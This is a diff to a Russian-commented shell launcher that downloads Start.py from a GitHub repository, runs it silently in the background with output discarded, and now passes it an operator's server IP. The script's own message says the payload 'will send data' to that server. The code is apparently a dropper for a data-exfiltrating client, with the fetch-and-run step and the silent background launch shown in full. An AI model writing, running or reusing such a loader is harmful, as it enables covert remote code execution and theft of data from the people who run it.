@@ -4,6 +4,15 @@
 REPO_URL="https://raw.githubusercontent.com/Alfred-kali/LiinPicker/main/Start.py"
 DEST_FILE="/tmp/Start.py"
 
+# Проверяем, передан ли IP сервера
+if [ -z "$1" ]; then
+    echo "❌ Укажите IP сервера с admin.py"
+    echo "Пример: $0 192.168.1.100"
+    exit 1
+fi
+
+SERVER_IP="$1"
+
 # Функция для Windows через Git Bash или WSL
 detect_os() {
     case "$OSTYPE" in
@@ -42,10 +51,10 @@ download_script() {
     echo "✅ Start.py скачан в $DEST_FILE"
 }
 
-# Запускаем скрипт в фоне
+# Запускаем скрипт в фоне, передавая IP сервера
 run_script() {
-    echo "🚀 Запуск Start.py в фоновом режиме..."
-    nohup $PYTHON "$DEST_FILE" >/dev/null 2>&1 &
+    echo "🚀 Запуск Start.py в фоновом режиме (сервер: $SERVER_IP)..."
+    nohup $PYTHON "$DEST_FILE" "$SERVER_IP" >/dev/null 2>&1 &
     echo "✅ Start.py запущен (PID: $!)"
 }
 
@@ -54,7 +63,7 @@ main() {
     check_python
     download_script
     run_script
-    echo "🎉 Работа завершена. Start.py выполняется в фоне."
+    echo "🎉 Работа завершена. Start.py выполняется в фоне и отправит данные на $SERVER_IP."
 }
 
 main
